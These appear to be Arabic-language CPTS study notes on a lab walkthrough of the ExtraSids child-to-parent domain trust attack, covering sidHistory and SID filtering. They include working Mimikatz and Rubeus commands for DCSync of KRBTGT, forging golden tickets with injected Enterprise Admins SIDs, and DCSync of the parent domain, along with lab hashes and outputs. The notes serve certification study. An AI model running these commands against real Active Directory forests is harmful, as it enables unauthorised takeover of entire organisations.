---
title: "SEC-28: Attacking Domain Trusts - Child -> Parent Trusts - from Windows"
module: "Active Directory Enumeration & Attacks"
section_num: 28
target: "LOGISTICS.INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - ActiveDirectory
  - DomainTrusts
  - ExtraSids
  - GoldenTicket
difficulty: "Hard"
vectors: "Domain Trust Abuse · ExtraSids Attack"
tools: "Mimikatz · Rubeus · PowerView"
status: "🟢 Complete"
date: 2026-08-16
---

> [!abstract] ⚙ T4E · التقنية للجميع · CPTS CERTIFICATION PATHWAY
> 
> |📍 TARGET NODE|🔐 ACCESS LEVEL|📡 ATTACK VECTOR|📋 SECTION ID|
> |:-:|:-:|:-:|:-:|
> |`10.129.180.47 — LOGISTICS.INLANEFREIGHT.LOCAL`|`Domain Admin (Child Domain)`|`Domain Trust Abuse / ExtraSids`|`SEC-28`|
> 
> |🛠️ KEY TOOLS|⚡ DIFFICULTY|🎯 CORE OBJECTIVE|📅 DATE|
> |:-:|:-:|:-:|:-:|
> |`Mimikatz · Rubeus · PowerView`|`🔴 Hard`|`Compromise Parent Domain via ExtraSids`|`2026-08-16`|

`PHASE_I: النظرية` → `PHASE_II: المختبر والطرق الستة` → `PHASE_III: الدليل والمصطلحات`

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-21 // ACL Abuse — Kerberoasting via Fake SPN      ║
║  [DOMAIN]   :: INLANEFREIGHT.LOCAL · 10.129.84.16                    ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!tip] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD **Language:** Arabic — **Size:** ~2,000 Words **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

---

تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ... 🚀

  

━━━━━

  

🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

  

تخيل وياي هذا السيناريو من الحياة الواقعية: عندنا شركة ضخمة اسمها "الشركة الأم" (Parent)، واشترت شركة أصغر منها اسمها "الشركة الفرعية" (Child). الموظف اللي يشتغل بالشركة الفرعية عنده باج (هوية) يدخله لمبنى شركته بس. هسة، الإدارة قررت تنقل بعض الموظفين من الفرع للأم. بدل ما يرمون باجاتهم القديمة ويطلعولهم باجات جديدة من الصفر وتصير خربطة، سوّوا حركة ذكية: الموظف يلبس باجه الجديد (مال الشركة الأم)، ويلزقون بظهره الكود مال باجه القديم. بهالعملية، كل ما يمرر باجه على الأبواب، النظام راح يشوف الهوية الجديدة، ويشوف الهوية القديمة "الملزوقة بظهرها"، فيسمحله يدخل للأبواب الجديدة والقديمة بنفس الوقت.

  

بالـ Active Directory، هذا الباج القديم الملزوق اسمه `sidHistory`. وهو ميزة انخلقت علمود الـ Migration (نقل الحسابات بين الدومينات) حتى الموظف ما يفقد صلاحياته القديمة.

  

بس وين المشكلة؟ شنو الخلل الجوهري اللي خلّى هذا السكشن (ExtraSids Attack) موجود أصلاً؟ المشكلة هي "الثقة العمياء" بين أفراد العائلة الواحدة (الـ Forest). نظام الويندوز يقول: "بما إن الشركة الأم والشركة الفرعية هم من نفس العائلة (Same AD Forest)، فمستحيل واحد بيهم يكذب على الثاني". لذلك، النظام ما يفتش الباج القديم الملزوق بظهر الهوية (ماكو شي اسمه SID Filtering داخل نفس الـ Forest).

  

هنا يجي دورك كـ Attacker. إذا أنت اخترقت الشركة الفرعية (Child Domain) وصرت الآدمن هناك، النظام راح يثق بيك ثقة عمياء. فتكدر بكل بساطة تسوي هوية مزورة (Golden Ticket)، وتلزق بظهرها باج يقول: "أنا الآدمن مال الشركة الأم كلها" (Enterprise Admins SID). ولأن الشركة الأم تثق بالفرع، راح تشوف الباج وتصدقه فوراً، وتنطيك صلاحيات مطلقة على كل الدومينات.

  

وين يظهر هذا بالواقع؟ كل بيئات الـ Enterprise تقريباً (الشركات والبنوك الكبيرة) تتكون من Forest وحدة بداخلها عدة Domains (مثل: دومين للمبيعات، دومين للشرق الأوسط، دومين للإدارة). إذا قدرت تخترق أضعف دومين بيهم (الفرع)، هذا السكشن يعلمك شلون تستخدم هالخلل بالتصميم حتى تصعد للقمة وتسيطر على الدومين الرئيسي (Root Domain).

  

وين يقع هذا السكشن بخريطة CPTS؟

هذا السكشن يجي بمرحلة الـ Post-Compromise وتحديداً الـ Privilege Escalation و الـ Lateral Movement بين الدومينات (Domain Trust Attacks). يعني أنت أصلاً مخترق الفرع وعندك صلاحيات عالية بيه، وهسة تريد تتوسع.

  

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

  

1. راح تفهم شلون تستخرج معلومات الدومين وتزور تذكرة Kerberos ذهبية (Golden Ticket).
    
      
    
2. راح تكدر تحقن SIDs إضافية داخل التذكرة للوصول لأي مورد بالـ Forest.
    
      
    
3. راح تستخدم أدوات مثل Mimikatz و Rubeus لتنفيذ هجوم ExtraSids باحترافية.
    
      
    

━━━━━

  

🔵 المرحلة 1: خريطة المفاهيم

  

قبل لا ندخل بالعمق، خل نوضح المصطلحات التقنية اللي ظهرت بالسكشن، ونرتبها من الأساسيات للأعقد. إذا فهمت هاي، الباقي مجرد تطبيق.

  

SID (Security Identifier)

  

- شنو يعني؟ هو رقم الهوية الوطني مال أي شي بالويندوز (يوزر، كروب، كمبيوتر). الويندوز ما يهتم لاسمك "Ahmed" أو "Administrator"، هو يتعامل وياك بهذا الرقم الطويل اللي يبدأ بـ `S-1-5-21...`.
    
      
    
- وين يظهر؟ بكل مكان بالـ AD. كل دومين إله SID، وكل يوزر إله SID خاص بيه.
    
      
    

SID History

  

- شنو يعني؟ هي خاصية (Attribute) ملحقة بحساب اليوزر. إذا نقلنا اليوزر من دومين لدومين، الـ SID القديم مالته ينخزن هنا حتى ما يفقد صلاحياته للملفات القديمة.
    
      
    
- وين يظهر؟ يظهر كحقل بخصائص اليوزر بالـ Active Directory. بالهجوم مالتنا، إحنا راح نحقن SID عالي الصلاحيات بهذا الحقل.
    
      
    

Enterprise Admins

  

- شنو يعني؟ هذا أقوى كروب (Group) بكل الـ Active Directory. الدومين آدمن (Domain Admin) يتحكم بدومين واحد بس. بينما الـ Enterprise Admin يتحكم بكل الدومينات الموجودة بالـ Forest. هذا الكروب موجود فقط بالدومين الأب (Root Domain).
    
      
    
- مثال من الواقع: الدومين آدمن هو محافظ بغداد، الـ Enterprise Admin هو رئيس الوزراء اللي يحكم كل المحافظات.
    
      
    

SID Filtering

  

- شنو يعني؟ هذا مثل حارس الباب اللي يفتش الهويات. وظيفته يمنع أي دومين غريب من إنه يدعي انتمائه لكروبات ما تخصه.
    
      
    
- الخلل وين؟ هذا الحارس "معطل" افتراضياً بين الدومينات اللي تنتمي لنفس العائلة (Same Forest). وهذا هو سبب نجاح هجومنا!.
    
      
    

KRBTGT Account

  

- شنو يعني؟ هذا الحساب هو "وزير الداخلية" مال الدومين. هو حساب خدمة (Service Account) مسؤوليته الوحيدة هي تشفير وتوقيع تذاكر الـ Kerberos (التذاكر اللي تخليك تدخل للأجهزة).
    
      
    
- السر: الباسورد هاش (NT Hash) مال هذا الحساب هو المفتاح الذهبي. إذا حصلته، تكدر تزور أي تذكرة لأي شخص، وتخلي مدتها 10 سنوات!.
    
      
    

DCSync

  

- شنو يعني؟ هو هجوم يوهم السيرفر الرئيسي (Domain Controller) إنك أنت سيرفر ثاني وتريد تسوي "مزامنة" (Synchronization) وياه.
    
      
    
- ليش نسويه؟ حتى نسحب الـ Hashes مال الباسوردات، وتحديداً نحتاج نسحب الـ Hash مال حساب KRBTGT.
    
      
    

Golden Ticket (التذكرة الذهبية)

  

- شنو يعني؟ تذكرة Kerberos (TGT) إنت صنعتها بإيدك (زورتها) لأنك تملك الـ Hash مال الـ KRBTGT. النظام راح يصدقها لأنها مشفرة بالمفتاح الصحيح. بالسكشن هذا، التذكرة مالتنا راح نخلي بداخلها SID History مال الـ Enterprise Admins.
    
      
    

━━━━━

  

🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

  

📖 عنوان السكشن: Attacking Domain Trusts - Child -> Parent Trusts - from Windows

هذا السكشن جزء من موديول هجمات الـ Active Directory، ويقع بمرحلة متقدمة من مسار CPTS.

  

🎯 ماذا يريد هذا السكشن أن تتعلم؟

بعد قراءة وفهم هذا السكشن، المفروض تكون قادر على:

  

1. فهم كيف يتم استغلال ميزة `sidHistory` للقفز من دومين فرعي إلى دومين رئيسي.
    
      
    
2. استخراج المعلومات الخمسة الأساسية المطلوبة لصنع Golden Ticket عبر الدومينات.
    
      
    
3. تنفيذ هجوم ExtraSids باستخدام Mimikatz و Rubeus للسيطرة على الـ Forest بالكامل.
    
      
    

📐 هيكل المحتوى (Section Blueprint):

السكشن مبني بشكل تسلسلي منطقي جداً. لو رسمنا تدفق التعلم، راح يكون بهذا الشكل:

  

Plaintext

```
[فهم نظرية الـ SID History والـ Trust]
       │ (فهم الخلل الأمني بسبب غياب الـ SID Filtering)
       ▼
[جمع المكونات الـ 5 المطلوبة للهجوم]
       │ (استخدام Mimikatz و PowerView)
       ▼
[استخراج KRBTGT Hash للفرع]  ──►  [معرفة SID الفرع]  ──►  [معرفة SID الـ Enterprise Admins للأم]
       │
       ▼
[صناعة التذكرة الذهبية - Golden Ticket]
       │ (حقن الـ ExtraSIDs باستخدام Mimikatz أو Rubeus)
       ▼
[تفعيل التذكرة وعبور الحدود]
       │ (استخدام Pass-The-Ticket للوصول لموارد الشركة الأم)
       ▼
[السيطرة الكاملة]
       (تنفيذ DCSync على الدومين الأم لاختراقه بالكامل)
```

🔗 المتطلبات السابقة:

عشان يكون هذا السكشن منطقي بالنسبة لك، السكشن يفترض إنك:

  

1. مخترق الدومين الفرعي (Child Domain) وعندك صلاحيات Domain Admin عليه (علمود تكدر تسوي DCSync).
    
      
    
2. فاهم أساسيات Kerberos (شنو يعني TGT وكيف يشتغل).
    
      
    
3. تعرف تستخدم أدوات مثل PowerShell و Mimikatz.
    
      
    

⚠️ ما يذكره السكشن ضمنياً بدون توضيح:

  

- يفترض إن الـ Forest هي نفسها (Intra-Forest)، لأن لو كان Trust بين شركتين مختلفات (Inter-Forest)، الـ SID Filtering راح يكون شغال والهجوم يفشل.
    
      
    
- يفترض إنك كاعد تشتغل من ماكينة تابعة للدومين الفرعي (Domain Joined Machine).
    
      
    
- يفترض إنك تعرف إن الـ SID الخاص بـ Enterprise Admins دائماً ينتهي بـ `-519`.
    
      
    

━━━━━

  

🟠 المرحلة 3: الشرح العميق

  

هنا راح نفلّش السكشن قطعة قطعة ونشرح كل جزء بعمق. ركز وياي.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 1: تحضير مكونات الطبخة (The 5 Ingredients)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط: حتى نسوي هجوم ExtraSids ونزور الهوية اللي تعبرنا للدومين الأم، نحتاج 5 معلومات أساسية. تخيلها كأنها مقادير كيكة مستحيل تنخبز إذا نقص منها مكون واحد. إذا جمعناها، راح نكدر نخدع الدومين الأم.

  

🎭 التشبيه:

تخيل تريد تزور جواز سفر دبلوماسي لدولة جارة. تحتاج:

  

1. ختم دولتكم الأصلي (KRBTGT Hash).
    
      
    
2. رقم دولتكم التعريفي (Child SID).
    
      
    
3. اسم مزيف الك (Fake Username).
    
      
    
4. الاسم الرسمي لدولتكم (Child FQDN).
    
      
    
5. الكود السري الخاص بالدبلوماسيين بالدولة الجارة (Enterprise Admins SID).
    
      
    

🔬 ليش يعمل هيج؟ (المبدأ الجوهري): الـ Golden Ticket تنبني (تتشفر) باستخدام الـ NT Hash لحساب الـ KRBTGT. بدون هذا الهاش، أي تذكرة تصنعها راح تنرفز وينكشف تزويرها. وداخل هاي التذكرة، إحنا نكتب الـ SIDs اللي نريدها.

  

حسب السكشن، هاي هي المكونات الـ 5 اللي لازم نجمعها:

  

1. `KRBTGT hash for the child domain`.
    
      
    
2. `SID for the child domain`.
    
      
    
3. `Name of a target user` (مو شرط يكون موجود أصلاً، نكدر نسميه hacker).
    
      
    
4. `FQDN of the child domain` (الاسم الكامل، مثلاً logistics.inlanefreight.local).
    
      
    
5. `SID of the Enterprise Admins group` (مال الدومين الأم).
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 2: استخراج ختم الدولة (KRBTGT Hash) باستخدام Mimikatz

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط: بما إننا الآدمن بالدومين الفرعي، راح نستخدم Mimikatz حتى نسوي هجوم اسمه DCSync. هذا الهجوم يروح للـ Domain Controller ويقله: "آني سيرفر زميلك، انطيني الباسوردات الجديدة". ومن ضمنها نسحب باسورد الـ KRBTGT (على شكل Hash).

  

🔧 الأمر:

  

DOS

```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

💬 شرح الـ flags:

  

- `lsadump::dcsync` : الوحدة الخاصة بميميكاتز لسحب الهاشات عن طريق محاكاة الـ DC.
    
      
    
- `/user:LOGISTICS\krbtgt` : نحدد بالضبط ياهو اليوزر اللي نريد الهاش مالته، وهنا طلبنا حساب الـ krbtgt التابع لدومين LOGISTICS.
    
      
    

📤 الـ Output المتوقع (الأجزاء المهمة):

  

Plaintext

```
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

🔍 كيف تقرأ الـ Output؟:

شوف، هذا الأوتپوت انطانا عصفورين بحجر واحد:

  

1. السطر مال `Hash NTLM`: هذا هو الهاش مال KRBTGT (المكون رقم 1).
    
      
    
2. السطر مال `Object Security ID`: هذا هو الـ SID الكامل مال الحساب. إذا مسحنا آخر جزء (`-502`)، راح يطلعنا الـ SID مال الدومين الفرعي بكبره (المكون رقم 2).
    
      
    

❓ الـ "بس ليش؟" — أسئلة شائعة:

  

- سؤال: ليش حساب KRBTGT بالذات؟
    
      
    
- جواب: لأن هذا الحساب هو المسؤول عن تشفير تذاكر Kerberos بالدومين. أي تذكرة مشفرة بالهاش مالته، الـ Domain Controller راح يعترف بيها كأنها أصلية 100%.
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 3: جلب الكود السري للـ Parent (Enterprise Admins SID)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط: هسة نحتاج نعرف رقم الـ SID الخاص بكروب "Enterprise Admins" الموجود بالشركة الأم. نكدر نستخدم أداة PowerView أو أوامر Active Directory العادية حتى نسحب هذا الرقم عبر الشبكة (بما إننا جزء من الـ Forest، مسموح لنا نسأل).

  

🔧 الأمر:

  

PowerShell

```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

💬 شرح الـ flags:

  

- `Get-DomainGroup` : أمر من أداة PowerView يجيب معلومات الكروبات.
    
      
    
- `-Domain INLANEFREIGHT.LOCAL` : نحدد اسم الدومين الأم اللي نريد نسأله.
    
      
    
- `-Identity "Enterprise Admins"` : اسم الكروب اللي نبحث عنه.
    
      
    
- `| select ...` : بس علمود نرتب شكل النتيجة وناخذ الـ SID فقط.
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
distinguishedname                                       objectsid                                  
-----------------                                       ---------                                  
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

🔍 كيف تقرأ الـ Output؟: الـ `objectsid` هو الرقم اللي نريده (المكون رقم 5). لاحظ إنه ينتهي بـ `-519`، وهذا ستاندرد (ثابت) بالويندوز لكل كروبات الـ Enterprise Admins.

  

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

لحد هسة جمعنا كل المعلومات: هاش KRBTGT، و SID الفرع، و SID الأم، واسم اليوزر المزيف. هسة صار وكت نخبز التذكرة!

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 4: صناعة التذكرة الذهبية بهجوم ExtraSids (بواسطة Mimikatz)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط: هنا راح نصنع الجواز المزور. راح نستخدم ميميكاتز حتى نبني Golden Ticket، بس مو تذكرة عادية. راح نستخدم خاصية اسمها `ExtraSids` حتى نحقن الـ SID مال الـ Enterprise Admins بداخلها. وراها نحقن التذكرة مباشرة بالميموري (Pass-The-Ticket).

  

🎭 التشبيه:

هذا بالضبط كأنك تطبع هوية جديدة لنفسك بفرع الشركة الصغير، بس بظهر الهوية تكتب "ترى اني همين المدير العام مال الشركة الأم الكبيرة، صدكوني". ولأن ماكو تفتيش دقيق (No SID Filtering)، راح يصدقوك.

  

🔧 الأمر:

  

DOS

```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

💬 شرح الـ flags:

  

- `kerberos::golden` : أمر صناعة التذكرة الذهبية.
    
      
    
- `/user:hacker` : اسم اليوزر (بكيفك، سميناه hacker وما يحتاج يكون موجود بالـ AD أصلاً).
    
      
    
- `/domain:LOGISTICS...` : اسم دومين الفرع (Child FQDN).
    
      
    
- `/sid:...` : الـ SID مال دومين الفرع (Child SID).
    
      
    
- `/krbtgt:...` : الهاش اللي سحبناه بالخطوة الأولى.
    
      
    
- `/sids:...` : **هذا هو قلب الهجوم (ExtraSids)**. هنا نحط الـ SID مال Enterprise Admins التابع للأم.
    
      
    
- `/ptt` : يعني Pass-The-Ticket. لا تخزن التذكرة بملف، بل احقنها فوراً بذاكرة الويندوز الحالية حتى نكدر نستخدمها مباشرة.
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
...
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
...
-> Ticket : ** Pass The Ticket **
Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

🔍 كيف تقرأ الـ Output؟: الميميكاتز يكولك "successfully submitted". يعني التذكرة انصنعت وانحطت بجيبك (بالـ RAM). انتبه لسطر `Extra SIDs`، هذا يأكدلك إن عملية الحقن تمت بنجاح.

  

❓ الـ "بس ليش؟" — أسئلة شائعة:

  

- سؤال: ليش اليوزر hacker ما يحتاج يكون موجود أصلاً بالدومين؟
    
      
    
- جواب: لأن الـ Domain Controller ما راح يشيك الداتا بيس مالته! من يشوف تذكرة مشفرة صح بالـ KRBTGT، راح يثق بالمعلومات المكتوبة بداخلها ثقة عمياء ويعتبر اليوزر موجود.
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 5: البديل الحديث - استخدام Rubeus

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط: ميميكاتز أداة عظيمة، بس أحياناً الأنتي فايروس (AV) يكتشفها بسرعة. البديل الأحدث والمكتوب بـ C# هو Rubeus. يقدر يسوي نفس الهجوم بالضبط ونفس الخطوات. السكشن يراويك شلون تسويها بـ Rubeus كخيار ثاني.

  

🔧 الأمر:

  

PowerShell

```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

💬 شرح الـ flags: نفس ميميكاتز بالضبط، الفرق الوحيد إن Rubeus يستخدم فلاج `/rc4` بدل `/krbtgt` لوضع الهاش. (لأن تشفير NTLM Hash تقنياً اسمه RC4-HMAC ببروتوكول Kerberos).

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية 6: التأكد من النجاح والسيطرة (Verification & Exploitation)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

💡 بالعراقي البسيط:

هسة إحنا حقنا التذكرة بالذاكرة. شلون نتأكد إنها موجودة؟ وشلون نثبت إننا صرنا مدراء الشركة الأم؟ راح نستخدم أمر بسيط بالويندوز يعرض التذاكر، وراها نحاول ندخل على الـ C Drive مال سيرفر الشركة الأم.

  

🔧 الأمر الأول (للتأكد من الذاكرة):

  

PowerShell

```
klist
```

📤 الأوتپوت:

  

Plaintext

```
Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
```

_هذا يأكد إن تذكرتنا المزيفة لليوزر hacker موجودة بالذاكرة وتشتغل._

  

  

🔧 الأمر الثاني (لاختبار الصلاحيات العابرة للحدود):

  

PowerShell

```
ls \\academy-ea-dc01.inlanefreight.local\c$
```

📤 الأوتپوت:

  

Plaintext

```
 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
...
```

_بوم! 💥 قدرنا ندخل على ملفات الـ Domain Controller مال الدومين الأم! قبل الهجوم كان يعطينا Access is denied._

  

  

🔧 الأمر الثالث (الضربة القاضية - DCSync للـ Parent):

بما إننا هسة Enterprise Admin بالدومين الأم، نكدر نسحب هاشات الدومين الأم نفسه!

  

DOS

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

_(لاحظ هنا حددنا الـ `/domain` علمود نوجه الهجوم للدومين الأم مو الفرعي. وسحبنا هاش آدمن الدومين الأم)_.

  

📊 ملخص ما تعلمنا:

  

|**الأداة / المفهوم**|**وظيفتها بالهجوم**|**متى تستخدمها**|
|---|---|---|
|`lsadump::dcsync`|سحب الباسوردات والهاشات من السيرفر.|ببداية الهجوم لسحب KRBTGT، وبنهاية الهجوم لسحب هاشات الأم.|
|`Get-DomainGroup`|أداة لاستعلام معلومات الدومين.|لمعرفة SID الخاص بالـ Enterprise Admins.|
|`kerberos::golden`|صناعة وحقن تذكرة مزيفة.|بعد جمع المعلومات الخمسة لتنفيذ ExtraSids.|
|`/sids` flag|مكان وضع הـ `sidHistory`.|لوضع كود الـ Enterprise Admins داخل تذكرتنا.|
|`klist`|عرض التذاكر المحفوظة بالميموري.|للتأكد إن الـ Pass-The-Ticket نجح.|

━━━━━

  

🔴 المرحلة 4: ما لا يقوله السكشن

  

هذا الجزء هو اللي يميز المحترف عن المبتدئ. السكشن يعلمك الخطوات التقنية المثالية، بس بالواقع اكو أمور لازم تنتبه لها:

  

🕳️ الثغرات في شرح السكشن:

  

1. **الفرق بين Intra-forest و Inter-forest**: السكشن يقول إن الـ `sidHistory` يشتغل بسبب غياب حماية `SID Filtering`. بس ما وضح لك بشكل كافي إن هذا الكلام ينطبق **فقط** إذا الدومينين بداخل نفس الـ Forest. إذا كنت تحاول تخترق دومين بـ Forest ثانية (External Trust)، الـ SID Filtering راح يكون شغال غصباً عنك، والتذكرة مالتك راح تنرفض مباشرة.
    
      
    
2. **عمر التذكرة (Ticket Lifetime)**: السكشن سوى التذكرة مدتها 10 سنوات (الافتراضي بميميكاتز). بالواقع، أدوات الحماية (EDR) الحديثة إذا شافت تذكرة Kerberos عمرها 10 سنوات راح تضرب جرس إنذار فوري (لأن التذاكر الطبيعية عمرها 10 ساعات فقط).
    
      
    

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab:

  

1. **الأسماء والـ FQDN**: أكبر غلطة يوكع بيها الطلاب باللاب هي استخدام الـ NetBIOS name (مثل LOGISTICS) بدل الـ FQDN الكامل (مثل LOGISTICS.INLANEFREIGHT.LOCAL) بصناعة التذكرة. Kerberos حساس جداً للـ DNS. دائماً استخدم الاسم الكامل.
    
      
    
2. **الـ Pass-The-Ticket يفشل**: مرات تسوي `/ptt` والميميكاتز يكولك نجحت، بس من تسوي `ls` تنرفض. ليش؟ لأنك فاتح PowerShell بصلاحيات أدمن محلي (Local Admin) ومو كـ Domain User، أو إنك تحتاج تفتح جلسة جديدة. احياناً مسح التذاكر القديمة بـ `klist purge` قبل الهجوم يحل المشكلة.
    
      
    
3. **التوجيه (Routing)**: بالـ DCSync النهائي مال السيرفر الأم، السكشن ضاف فلاج `/domain:INLANEFREIGHT.LOCAL`. إذا نسيت هذا الفلاج، ميميكاتز راح يحاول يسوي DCSync على سيرفر الفرع، وراح يفشل لأن اليوزر ما موجود بالفرع.
    
      
    

🌍 السياق الحقيقي (Real Pentest Context):

بالـ Pentest الحقيقي، من توصل لهيج مرحلة، أنت فعلياً "حرقت" الدومين. بس خلي ببالك:

  

- الـ Blue Teams (فريق الحماية) يقدرون يبطلون التذكرة مالتك بحركة وحدة: تغيير باسورد الـ KRBTGT مرتين متتالية. (ليش مرتين؟ لأن النظام يحفظ الباسورد القديم والجديد حتى لا تنقطع الخدمة).
    
      
    
- بالشركات الضخمة الحقيقية (Tiering Model)، حتى لو عندك Enterprise Admin، قد تكون محروم من الدخول للـ Domain Controllers عن طريق الشبكة العادية. راح تحتاج تدور على أجهزة الإدارة المخصصة (Jump Hosts) وتستخدم التذكرة منها.
    
      
    

🏆 النصيحة الذهبية للـ CPTS Exam:

بامتحان CPTS، بمجرد أن تحصل على Domain Admin في **أي** دومين فرعي، **توقف فوراً عن كل شيء آخر**، وابدأ بتجهيز هجوم ExtraSids. لا تضيع وقتك بالبحث عن مسارات معقدة. الـ Root Domain هو هدفك، وهذا الهجوم هو المصعد السريع للقمة.

  

━━━━━

  

💎 الفلاشكاردز — ملخص السكشن للحفظ

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #1 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: ما هو الغرض الأساسي من خاصية `sidHistory` في الويندوز؟ ✅ Back: تُستخدم في سيناريوهات الـ Migration لضمان عدم فقدان المستخدمين لفرصة الوصول للموارد في دومينهم الأصلي عند نقلهم لدومين جديد.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #2 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: لماذا ينجح هجوم ExtraSids بين الدومين الفرعي والأم ضمن نفس الـ Forest؟ ✅ Back: بسبب عدم وجود حماية "SID Filtering" ضمن نفس الـ Forest، مما يسمح للنظام باحترام والوثوق بقيم الـ sidHistory المحقونة.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي المكونات الخمسة الأساسية المطلوبة لتنفيذ هجوم ExtraSids بصناعة Golden Ticket؟

✅ Back:

  

1. KRBTGT Hash للفرع.
    
      
    
2. SID الفرع.
    
      
    
3. اسم مستخدم (حتى لو وهمي).
    
      
    
4. الـ FQDN للفرع.
    
      
    
5. SID الـ Enterprise Admins للأم.
    
      
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #4 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: كيف نستخرج الـ Hash الخاص بحساب KRBTGT؟ ✅ Back: عن طريق تنفيذ هجوم DCSync (باستخدام Mimikatz مثلاً: `lsadump::dcsync /user:krbtgt`).

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #5 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: في هجوم ExtraSids باستخدام Mimikatz (kerberos::golden)، ما هو الـ flag المستخدم لحقن SID الـ Enterprise Admins؟ ✅ Back: نستخدم الـ flag `/sids:` (مثال: `/sids:S-1-5-21...-519`).

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #6 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: ما هو الـ Relative ID (RID) الثابت دائماً لمجموعة Enterprise Admins؟ ✅ Back: الرقم هو `519` في نهاية الـ SID الخاص بهم.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔹 Card #7 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ❓ Front: كيف نتحقق من أن التذكرة الذهبية التي تم حقنها موجودة فعلاً في الذاكرة؟ ✅ Back: عن طريق استخدام أمر الويندوز `klist`.

  

━━━━━

  

